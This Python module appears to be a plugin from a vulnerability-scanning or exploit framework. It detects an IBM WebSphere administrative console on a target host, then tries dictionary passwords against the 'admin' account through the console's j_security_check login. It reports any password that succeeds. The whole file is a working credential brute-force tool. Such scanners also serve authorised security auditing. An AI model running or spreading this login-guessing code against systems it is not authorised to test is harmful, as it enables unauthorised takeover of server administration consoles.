# -*- coding:utf-8 -*-

import re
from exp.lib.httpparse import httpparse
from exp.lib.gla import getpassdict

def verify(protocol,ip,port):
    path = '/ibm/console/logon.jsp'
    url = protocol+'://'+ip+':'+str(port)+path
    print('testing if websphere Console')
    http = httpparse()
    passdictarr = getpassdict()
    ps = passdictarr.get_pass_dict()
    ps.append('websphere')
    try:
        tm = http.httpreq('GET', protocol, ip, port, path)
        if re.search('WebSphere',str(tm[2]),re.I):
            for psw in ps:
                data = 'j_username=admin&j_password='+psw+'&action=%E7%99%BB%E5%BD%95'
                npath = '/ibm/console/j_security_check'
                try:
                    data = data.encode('utf-8')
                    tm = http.httpreq('POST', protocol, ip, port, path=npath,data=data)
                    for item in tm[1]:
                        if item[0] == 'Content-Type':
                            res = item[1]
                            if 'logonError' in res:
                                pass
                            else:
                                nspath = protocol+'://'+ip+':'+str(port)+'/ibm/console/'
                                if nspath == res:
                                    msg =  'Find'+ 'Websphere-Console! with pass '+psw+ ' in url:' +protocol+'://'+ip+':'+str(port)+npath
                                    print(msg)
                                    number = 'v13'
                                    return True,url,number,msg
                                else:
                                    pass
                        else:
                            pass
                    else:
                        pass
                except Exception as e:
                    pass
            else:
                msg = 'cannot log on websphere console'
                number = 'v0'
                return False,url,number,msg
        else:
            msg = 'it is not websphere console'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg






